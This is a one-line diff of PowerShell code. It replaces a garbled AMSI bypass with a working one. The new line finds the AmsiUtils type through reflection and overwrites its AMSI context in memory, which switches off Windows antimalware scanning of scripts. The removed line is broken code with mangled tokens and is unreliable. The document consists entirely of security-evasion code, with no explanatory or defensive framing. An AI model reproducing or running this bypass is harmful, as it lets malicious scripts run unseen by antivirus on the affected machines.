@@ -1,1 +1,1 @@
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$dlds('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = m.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+[Ref].Assembly.GetTypes() | ForEach-Object {if($_.Name -like"*iUtils"){$u=$_}}; $u.GetFields('NonPublic,Static') | ForEach-Object {if($_.Name -like"*Context"){$c=$_}}; $ctx=$c.GetValue($null); [System.Runtime.InteropServices.Marshal]::Copy(@(0),0,$ctx,1)
